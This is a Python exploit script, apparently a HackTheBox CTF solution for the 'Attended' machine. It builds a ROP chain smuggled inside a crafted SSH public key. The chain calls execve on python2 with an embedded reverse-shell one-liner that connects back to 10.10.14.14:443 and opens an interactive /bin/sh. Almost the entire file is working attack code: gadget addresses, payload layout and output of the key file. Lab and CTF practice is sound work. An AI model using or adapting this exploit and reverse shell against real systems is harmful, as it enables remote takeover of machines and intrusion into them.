#!/usr/bin/python3

##########################
##
## 0xdf, mythic-rare
## https://0xdf.gitlab.io/2021/05/08/htb-attended.html
##
##

import pyperclip 
import struct
from base64 import b64encode
from pwn import *


# set constants
ip = '10.10.14.14'
port = 443
shell = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\0'.encode()
execve_args = [b'/usr/local/bin/python2\0', b'-c\0', shell]
base_addr = 0x6010c0

# Gadgets
pop_rdx = p64(0x40036a)
not_al = p64(0x40036d)
shr_eax = p64(0x400370)
movss_rdx = p64(0x40037b) # moves floating point value into xmm0
cvtss2si_esi = p64(0x400380)  # converts float in xmm0 to int in esi
mov_rdi_rsi_pop_rdx = p64(0x400367)
syscall = p64(0x4003cf)

# SSH header
buf = b''
buf += p32(7, endian='big')      # name len
buf += b'ssh-rsa'                # name
buf += p32(3, endian='big')      # e len
buf += pack(0x10001, 24, endian='big') # e
buf += p32(0x500 - 22, endian='big')  # length of n
buf += b'\x00\xcc'               # bytes from real n to get started

# Add strings, record addr of each
execve_args_addrs = []
for arg in execve_args:
    execve_args_addrs += [len(buf) + base_addr]
    buf += arg

# Add pointers to each string, recording start of array
vars_array_addr = len(buf) + base_addr
for addr in execve_args_addrs:
    buf += p64(addr) 
buf += p64(0)  # null terminal array of pointers

# Add addr of "python2" str as float, record addr
python_str_as_float = len(buf) + base_addr
buf += struct.pack('<f', execve_args_addrs[0]).ljust(8, b'\0')

# Add addr of array of string pointers as float, record address
args_array_as_float = len(buf) + base_addr
buf += struct.pack('<f', vars_array_addr).ljust(8, b'\0')

# Spacing to get to return address 
buf += b"\0" * (0x308 - len(buf))

# ROP 
## rax --> 59
#           start 00000000
buf += not_al   # 11111111
buf += shr_eax  # 01111111
buf += shr_eax  # 00111111
buf += not_al   # 11000000
buf += shr_eax  # 01100000
buf += not_al   # 10011111
buf += shr_eax  # 01001111
buf += shr_eax  # 00100111
buf += shr_eax  # 00010011
buf += not_al   # 11101100
buf += shr_eax  # 01110110
buf += shr_eax  # 00111011 = 59 = 0x3b

## rdi --> pointer to "/usr/local/bin/python2"
buf += pop_rdx
buf += p64(python_str_as_float)
buf += movss_rdx
buf += cvtss2si_esi
buf += mov_rdi_rsi_pop_rdx  # move to rdi, and get next rdx

## rsi --> pointer to args array
buf += p64(args_array_as_float)
buf += movss_rdx
buf += cvtss2si_esi

## rdx --> 0 (no env)
buf += pop_rdx
buf += p64(0)

## syscall
buf += syscall

# Encode Buffer
b64str = b64encode(buf.ljust(0x500, b'\0')).decode()

#key = f'run a a a {b64str}'
key = f'ssh-rsa {b64str} 0xdf'
# Output three ways
with open('aaaa.pub', 'w') as f:
    f.write(key)
print(key)
pyperclip.copy(key)

###############################
##
##
